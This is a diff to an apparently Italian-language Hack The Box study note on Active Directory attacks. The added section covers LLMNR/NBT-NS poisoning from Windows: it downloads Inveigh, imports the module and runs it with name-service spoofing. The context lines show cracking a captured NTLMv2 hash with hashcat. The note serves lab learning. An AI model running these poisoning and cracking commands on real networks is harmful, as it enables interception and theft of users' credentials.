@@ -139,6 +139,14 @@ i log di Responder sono storati in **/usr/share/responder/logs**
 `j4k1dibe@htb[/htb]$ hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt`, cracking the hash with hashcat mode 5600
 
 
+# LLMNR/NBT-NS Poisoning from Windows
 
+scarica Inveigh da https://github.com/Kevin-Robertson/Inveigh
 
+```
+PS C:\htb> Import-Module .\Inveigh.ps1
+PS C:\htb> (Get-Command Invoke-Inveigh).Parameters
+```
+
+`PS C:\htb> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y`
 
